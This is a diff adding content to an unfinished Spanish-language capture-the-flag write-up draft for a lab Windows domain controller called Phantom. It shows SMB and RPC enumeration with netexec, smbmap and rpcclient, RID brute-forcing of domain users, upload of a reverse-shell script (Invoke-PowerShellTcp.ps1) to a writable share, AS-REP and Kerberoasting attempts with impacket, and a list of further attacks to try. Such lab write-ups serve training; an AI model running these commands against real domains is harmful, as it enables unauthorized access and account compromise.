@@ -14,7 +14,13 @@ categories:
 tags:
   - Windows
   - Active Directory
-  - 
+  - SMB
+  - RPC
+  - Kerberos
+  - WinRM
+  - SMB Enumeration
+  - RYD Cycling Attack
+  - RPC Enumeration
   - OSCP Style
 ---
 ![](/assets/images/THL-writeup-phantom/phantom.png)
@@ -37,14 +43,18 @@ Herramientas utilizadas:
 	<ul>
 		<li><a href="#Recopilacion">Recopilación de Información</a></li>
 			<ul>
+				<li><a href="#Hosts">Descubrimiento de Hosts</a></li>
 				<li><a href="#Ping">Traza ICMP</a></li>
 				<li><a href="#Puertos">Escaneo de Puertos</a></li>
 				<li><a href="#Servicios">Escaneo de Servicios</a></li>
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#SMB">Enumeración de Servicio SMB</a></li>
+				<ul>
+					<li><a href="#RYD">Aplicando RYD Cycling Attack</a></li>
+				</ul>
+				<li><a href="#RPC">Enumeración de Servicio RPC</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
@@ -287,10 +297,15 @@ Gracias a este escaneo, podemos ver muchas cosas interesantes:
 ```bash
 echo "192.168.56.100 PHANTOM.THL DC01.PHANTOM.THL" >> /etc/hosts
 ```
-* 
-* 
-* 
-* 
+* Vemos que el **puerto 5985** esta abierto, lo que nos dice que quizá nos podamos conectar a la máquina víctima vía **WinRM**.
+* El **servicio SMB** nos dice que se necesita un usuario y contraseña para poder utilizarlo.
+
+Para avanzar con esta máquina, tenemos un usuario y contraseña que nos puede ayudar a encontrar alguna vulnerabilidad:
+```bash
+User: mark
+Pass: suP3rPa$sw0rd2026!&
+```
+Vamos a comenzar con enumeración del **servicio SMB**, luego del **servicio RPC** y por último veamos que podemos realizar antes el **servicio Kerberos**.
 
 
 <br>
@@ -302,30 +317,245 @@ echo "192.168.56.100 PHANTOM.THL DC01.PHANTOM.THL" >> /etc/hosts
 <br>
 
 
-<h2 id=""></h2>
+<h2 id="SMB">Enumeración de Servicio SMB</h2>
 
+Utilicemos la herramienta **netexec** para ver información del **servicio SMB**:
 ```bash
-
+nxc smb 192.168.56.100
+SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
 ```
 
+Ahora, probemos si las credenciales que nos dieron funcionan:
 ```bash
-
+nxc smb 192.168.56.100 -u 'mark' -p 'suP3rPa$sw0rd2026!&'
+SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\mark:suP3rPa$sw0rd2026!&
 ```
+Si funcionan.
 
+Veamos qué archivos compartidos existen con la herramienta **smbmap**:
 ```bash
-
+smbmap -H 192.168.56.100 -u 'mark' -p 'suP3rPa$sw0rd2026!&' --no-banner
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
+                                                                                                                             
+[+] IP: 192.168.56.100:445	Name: 192.168.56.100      	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Admin remota
+	C$                                                	NO ACCESS	Recurso predeterminado
+	Dev Tools                                         	READ, WRITE	Dev Tools
+	IPC$                                              	READ ONLY	IPC remota
+	NETLOGON                                          	READ ONLY	Recurso compartido del servidor de inicio de sesi¢n 
+	SYSVOL                                            	READ ONLY	Recurso compartido del servidor de inicio de sesi¢n 
+[*] Closed 1 connections
 ```
+Existe un directorio en el que podemos leer y escribir.
 
+Veamos su contenido:
 ```bash
-
+smbmap -H 192.168.56.100 -u 'mark' -p 'suP3rPa$sw0rd2026!&' -r 'Dev Tools' --no-banner
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
+                                                                                                                             
+[+] IP: 192.168.56.100:445	Name: 192.168.56.100      	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Admin remota
+	C$                                                	NO ACCESS	Recurso predeterminado
+	Dev Tools                                         	READ, WRITE	Dev Tools
+	./Dev Tools
+	dr--r--r--                0 Sun Apr 26 23:30:33 2026	.
+	dr--r--r--                0 Sat Feb 21 11:29:29 2026	..
+	IPC$                                              	READ ONLY	IPC remota
+	NETLOGON                                          	READ ONLY	Recurso compartido del servidor de inicio de sesi¢n 
+	SYSVOL                                            	READ ONLY	Recurso compartido del servidor de inicio de sesi¢n 
+[*] Closed 1 connections
 ```
+Curiosamente, no hay nada.
 
-<p align="center">
-<img src="/assets/images/THL-writeup-/Captura#.png">
-</p>
+Lo que podríamos hacer es obtener todos los usuarios existentes de la máquina, aplicando un **RYD Cycling Attack**.
+
+<br>
+
+<h3 id="RYD">Aplicando RYD Cycling Attack</h3>
+
+Esto lo aplicaremos con la herramienta **netexec** y la flag `--rid-brute`:
+```bash
+nxc smb 192.168.56.100 -u 'mark' -p 'suP3rPa$sw0rd2026!&' --rid-brute
+SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\mark:suP3rPa$sw0rd2026!& 
+SMB         192.168.56.100  445    DC01             498: PHANTOM\Enterprise Domain Controllers de sólo lectura (SidTypeGroup)
+SMB         192.168.56.100  445    DC01             500: PHANTOM\Administrador (SidTypeUser)
+SMB         192.168.56.100  445    DC01             501: PHANTOM\Invitado (SidTypeUser)
+SMB         192.168.56.100  445    DC01             502: PHANTOM\krbtgt (SidTypeUser)
+SMB         192.168.56.100  445    DC01             512: PHANTOM\Admins. del dominio (SidTypeGroup)
+SMB         192.168.56.100  445    DC01             513: PHANTOM\Usuarios del dominio (SidTypeGroup)
+SMB         192.168.56.100  445    DC01             514: PHANTOM\Invitados del dominio (SidTypeGroup)
+SMB         192.168.56.100  445    DC01             515: PHANTOM\Equipos del dominio (SidTypeGroup)
+SMB         192.168.56.100  445    DC01             516: PHANTOM\Controladores de dominio (SidTypeGroup)
+SMB         192.168.56.100  445    DC01             517: PHANTOM\Publicadores de certificados (SidTypeAlias)
+SMB         192.168.56.100  445    DC01             518: PHANTOM\Administradores de esquema (SidTypeGroup)
+SMB         192.168.56.100  445    DC01             519: PHANTOM\Administradores de empresas (SidTypeGroup)
+SMB         192.168.56.100  445    DC01             520: PHANTOM\Propietarios del creador de directivas de grupo (SidTypeGroup)
+SMB         192.168.56.100  445    DC01             521: PHANTOM\Controladores de dominio de sólo lectura (SidTypeGroup)
+SMB         192.168.56.100  445    DC01             522: PHANTOM\Controladores de dominio clonables (SidTypeGroup)
+SMB         192.168.56.100  445    DC01             525: PHANTOM\Protected Users (SidTypeGroup)
+SMB         192.168.56.100  445    DC01             526: PHANTOM\Administradores clave (SidTypeGroup)
+SMB         192.168.56.100  445    DC01             527: PHANTOM\Administradores clave de la organización (SidTypeGroup)
+SMB         192.168.56.100  445    DC01             553: PHANTOM\Servidores RAS e IAS (SidTypeAlias)
+SMB         192.168.56.100  445    DC01             571: PHANTOM\Grupo de replicación de contraseña RODC permitida (SidTypeAlias)
+SMB         192.168.56.100  445    DC01             572: PHANTOM\Grupo de replicación de contraseña RODC denegada (SidTypeAlias)
+SMB         192.168.56.100  445    DC01             1000: PHANTOM\DC01$ (SidTypeUser)
+SMB         192.168.56.100  445    DC01             1101: PHANTOM\DnsAdmins (SidTypeAlias)
+SMB         192.168.56.100  445    DC01             1102: PHANTOM\DnsUpdateProxy (SidTypeGroup)
+SMB         192.168.56.100  445    DC01             1103: PHANTOM\mark (SidTypeUser)
+SMB         192.168.56.100  445    DC01             1104: PHANTOM\bob (SidTypeUser)
+SMB         192.168.56.100  445    DC01             1105: PHANTOM\joe (SidTypeUser)
+SMB         192.168.56.100  445    DC01             1106: PHANTOM\mia (SidTypeUser)
+SMB         192.168.56.100  445    DC01             1107: PHANTOM\sandra (SidTypeUser)
+SMB         192.168.56.100  445    DC01             1108: PHANTOM\maria (SidTypeUser)
+SMB         192.168.56.100  445    DC01             1109: PHANTOM\ana (SidTypeUser)
+SMB         192.168.56.100  445    DC01             1110: PHANTOM\michael (SidTypeUser)
+SMB         192.168.56.100  445    DC01             1111: PHANTOM\ian (SidTypeUser)
+SMB         192.168.56.100  445    DC01             1112: PHANTOM\joshua (SidTypeUser)
+SMB         192.168.56.100  445    DC01             1113: PHANTOM\frank (SidTypeUser)
+SMB         192.168.56.100  445    DC01             1115: PHANTOM\tomas (SidTypeUser)
+SMB         192.168.56.100  445    DC01             1116: PHANTOM\robert (SidTypeUser)
+SMB         192.168.56.100  445    DC01             1117: PHANTOM\IT (SidTypeGroup)
+SMB         192.168.56.100  445    DC01             1118: PHANTOM\Support (SidTypeGroup)
+SMB         192.168.56.100  445    DC01             1119: PHANTOM\RRHH (SidTypeGroup)
+SMB         192.168.56.100  445    DC01             1120: PHANTOM\Finances (SidTypeGroup)
+SMB         192.168.56.100  445    DC01             1121: PHANTOM\Developers (SidTypeGroup)
+SMB         192.168.56.100  445    DC01             1122: PHANTOM\HelpDesk (SidTypeGroup)
+SMB         192.168.56.100  445    DC01             1123: PHANTOM\DevOps (SidTypeGroup)
+SMB         192.168.56.100  445    DC01             1124: PHANTOM\LegacyAdmins (SidTypeUser)
+SMB         192.168.56.100  445    DC01             1125: PHANTOM\Monitoring (SidTypeGroup)
+```
+Observa todos los grupos que obtenemos y los usuarios.
+
+Con estos usuarios podemos intentar aplicar un **Password Spraying** para saber si alguno de estos tiene la misma contraseña que nuestro usuario actual, pero esto no servira.
+
+Otra opción que tenemos es subir un archivo al directorio **Dev Tools**, suponiendo que todos los archivos que se suban se ejecuten, pero tampoco servira.
+
+Por ahora, dejemos un poco **SMB** y apliquemos enumeración al **servicio RPC**.
+
+<br>
+
+<h2 id="RPC">Enumeración del Servicio RPC</h2>
+
+Entremos al **servicio RPC** utilizando la herramienta **rpcclient**:
+```bash
+rpcclient -U 'mark%suP3rPa$sw0rd2026!&' 192.168.56.100
+rpcclient $>
+```
+Estamos dentro.
+
+Veamos los usuarios existentes:
+```bash
+rpcclient $> enumdomusers
+user:[Administrador] rid:[0x1f4]
+user:[Invitado] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[mark] rid:[0x44f]
+user:[bob] rid:[0x450]
+user:[joe] rid:[0x451]
+user:[mia] rid:[0x452]
+user:[sandra] rid:[0x453]
+user:[maria] rid:[0x454]
+user:[ana] rid:[0x455]
+user:[michael] rid:[0x456]
+user:[ian] rid:[0x457]
+user:[joshua] rid:[0x458]
+user:[frank] rid:[0x459]
+user:[tomas] rid:[0x45b]
+user:[robert] rid:[0x45c]
+user:[LegacyAdmins] rid:[0x464]
+```
+Bien, no cambia a cuando lo hicimos con el **servicio SMB**.
+
+Enumeremos las descripciones de cada usuario con `querydispinfo`, esto para ver si aparece algún dato de cualquier usuario que nos sea de ayuda:
+```bash
+rpcclient $> querydispinfo
+index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrador	Name: (null)	Desc: Cuenta integrada para la administración del equipo o dominio
+index: 0xfb7 RID: 0x455 acb: 0x00000210 Account: ana	Name: Ana	Desc: (null)
+index: 0xfb2 RID: 0x450 acb: 0x00000210 Account: bob	Name: Bob	Desc: (null)
+index: 0xfbb RID: 0x459 acb: 0x00000210 Account: frank	Name: Frank	Desc: (null)
+index: 0xfb9 RID: 0x457 acb: 0x00000210 Account: ian	Name: Ian	Desc: (null)
+index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Invitado	Name: (null)	Desc: Cuenta integrada para el acceso como invitado al equipo o dominio
+index: 0xfb3 RID: 0x451 acb: 0x00000210 Account: joe	Name: Joe	Desc: (null)
+index: 0xfba RID: 0x458 acb: 0x00000210 Account: joshua	Name: Joshua	Desc: (null)
+index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Cuenta de servicio de centro de distribución de claves
+index: 0xfc6 RID: 0x464 acb: 0x00000210 Account: LegacyAdmins	Name: LegacyAdmins	Desc: Legacy administrative group maintained for backward compatibility with older systems.
+index: 0xfb6 RID: 0x454 acb: 0x00000210 Account: maria	Name: Maria	Desc: (null)
+index: 0xfb1 RID: 0x44f acb: 0x00000210 Account: mark	Name: Mark	Desc: (null)
+index: 0xfb4 RID: 0x452 acb: 0x00000210 Account: mia	Name: Mia	Desc: (null)
+index: 0xfb8 RID: 0x456 acb: 0x00000210 Account: michael	Name: Michael	Desc: (null)
+index: 0xfbe RID: 0x45c acb: 0x00000210 Account: robert	Name: Robert	Desc: (null)
+index: 0xfb5 RID: 0x453 acb: 0x00000210 Account: sandra	Name: Sandra	Desc: (null)
+index: 0xfbd RID: 0x45b acb: 0x00000210 Account: tomas	Name: Tomas	Desc: (null)
+```
+No hay nada que destacar.
+
+Enumeremos los grupos existentes:
+```bash
+rpcclient $> enumdomgroups
+group:[Enterprise Domain Controllers de sólo lectura] rid:[0x1f2]
+group:[Admins. del dominio] rid:[0x200]
+group:[Usuarios del dominio] rid:[0x201]
+group:[Invitados del dominio] rid:[0x202]
+group:[Equipos del dominio] rid:[0x203]
+group:[Controladores de dominio] rid:[0x204]
+group:[Administradores de esquema] rid:[0x206]
+group:[Administradores de empresas] rid:[0x207]
+group:[Propietarios del creador de directivas de grupo] rid:[0x208]
+group:[Controladores de dominio de sólo lectura] rid:[0x209]
+group:[Controladores de dominio clonables] rid:[0x20a]
+group:[Protected Users] rid:[0x20d]
+group:[Administradores clave] rid:[0x20e]
+group:[Administradores clave de la organización] rid:[0x20f]
+group:[DnsUpdateProxy] rid:[0x44e]
+group:[IT] rid:[0x45d]
+group:[Support] rid:[0x45e]
+group:[RRHH] rid:[0x45f]
+group:[Finances] rid:[0x460]
+group:[Developers] rid:[0x461]
+group:[HelpDesk] rid:[0x462]
+group:[DevOps] rid:[0x463]
+group:[Monitoring] rid:[0x465]
+```
+Hay algunos grupos que se ven interesantes, por ejemplo, los grupos **IT, Developers, DevOps, Monitoring y Support**, así que quizá esto nos ayuda después.
+
+Por último, te muestro el siguiente oneliner que nos ayuda a obtener todos los usuarios existentes con **rpcclient**:
+```bash
+rpcclient -U 'mark%suP3rPa$sw0rd2026!&' 192.168.56.100 -c "enumdomusers" | awk -F '[][]' '{print $2}'
+Administrador
+Invitado
+krbtgt
+mark
+bob
+joe
+mia
+sandra
+maria
+ana
+michael
+ian
+joshua
+frank
+tomas
+robert
+LegacyAdmins
+```
+Ya solo guardalos en un archivo o solo agrega que la salida se guarde en un archivo.
 
 
-<a href="link" target="_blank">titulo_del_link</a>
+
+ATAQUES POR PROBAR:
+SCF attack -> carga el file.scf y activa responder
+Fuerza bruta por kerberos o smb en base a roles de usuarios
+Usar bloodhound-python y analizar con bloodhound
+ENumerar denuevo RPC y ver cada descripcion de usuario, roles y grupos a los que pertenecen.
 
 
 <br>
@@ -340,7 +570,31 @@ echo "192.168.56.100 PHANTOM.THL DC01.PHANTOM.THL" >> /etc/hosts
 <h2 id=""></h2>
 
 ```bash
-
+❯ smbmap -H 192.168.56.100 -u 'mark' -p 'suP3rPa$sw0rd2026!&' --upload Invoke-PowerShellTcp.ps1 'Dev Tools/Invoke-PowerShellTcp.ps1' --no-banner
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
+[+] Starting upload: Invoke-PowerShellTcp.ps1 (4405 bytes)
+[+] Upload complete..                                                                                                    
+[*] Closed 1 connections                                                                                                     
+                                                                                                                                                                                              
+❯ smbmap -H 192.168.56.100 -u 'mark' -p 'suP3rPa$sw0rd2026!&' -r 'Dev Tools' --no-banner
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
+                                                                                                                             
+[+] IP: 192.168.56.100:445	Name: PHANTOM.THL         	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Admin remota
+	C$                                                	NO ACCESS	Recurso predeterminado
+	Dev Tools                                         	READ, WRITE	Dev Tools
+	./Dev Tools
+	dr--r--r--                0 Mon Apr 27 00:23:14 2026	.
+	dr--r--r--                0 Sat Feb 21 11:29:29 2026	..
+	fr--r--r--             4405 Sun Apr 26 23:49:21 2026	Invoke-PowerShellTcp.ps1
+	IPC$                                              	READ ONLY	IPC remota
+	NETLOGON                                          	READ ONLY	Recurso compartido del servidor de inicio de sesi¢n 
+	SYSVOL                                            	READ ONLY	Recurso compartido del servidor de inicio de sesi¢n 
+[*] Closed 1 connections
 ```
 
 ```bash
@@ -372,6 +626,31 @@ echo "192.168.56.100 PHANTOM.THL DC01.PHANTOM.THL" >> /etc/hosts
 ```
 
 ```bash
+❯ impacket-GetNPUsers -no-pass -usersfile usuarios.txt PHANTOM.THL/
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] User Administrador doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User bob doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User joe doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User mia doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User sandra doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User maria doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User ana doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User michael doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User ian doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User joshua doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User frank doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User tomas doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User robert doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User LegacyAdmins doesn't have UF_DONT_REQUIRE_PREAUTH set
+                                                                                                                                                                                              
+❯ impacket-GetUserSPNs 'PHANTOM.THL/mark:suP3rPa$sw0rd2026!&' -dc-host DC01.PHANTOM.THL
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+No entries found!
 
 ```
 
@@ -387,6 +666,13 @@ echo "192.168.56.100 PHANTOM.THL DC01.PHANTOM.THL" >> /etc/hosts
 
 
 <h2 id=""></h2>
+
+
+<p align="center">
+<img src="/assets/images/THL-writeup-phantom/Captura1.png">
+</p>
+
+
 
 ```bash
 
